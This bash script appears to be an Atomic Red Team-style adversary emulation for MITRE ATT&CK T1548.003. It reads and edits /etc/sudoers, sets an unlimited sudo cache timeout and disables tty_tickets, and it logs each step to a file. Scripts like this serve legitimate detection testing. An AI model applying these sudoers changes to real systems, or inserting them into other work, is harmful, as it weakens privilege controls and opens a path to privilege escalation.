#! /bin/bash

# T1548.003 - Abuse Elevation Control Mechanism: Sudo and Sudo Caching

function a() {
    # Atomic Test 1 - Sudo usage
    sudo -l      
    sudo cat /etc/sudoers
    sudo vim /etc/sudoers
    echo  $(date -u) "Completed T1548.003 - Sudo usage" >> /tmp/attacktest.txt 
    sleep 60
}

function b() {
    # Atomic Test 2 - Unlimited sudo cache timeout
    sudo sed -i 's/env_reset.*$/env_reset,timestamp_timeout=-1/' /etc/sudoers
    sudo visudo -c -f /etc/sudoers
    echo  $(date -u) "Completed T1548.003 - Unlimited sudo cache timeout" >> /tmp/attacktest.txt 
    sleep 60
}

function c() {
    # Atomic Test 3 - Disable tty_tickets for sudo caching
    sudo sh -c "echo Defaults "'!'"tty_tickets >> /etc/sudoers"
    sudo visudo -c -f /etc/sudoers
    echo  $(date -u) "Completed T1548.003 - Disable tty_tickets for sudo caching" >> /tmp/attacktest.txt 
    sleep 60
}

a
b
c

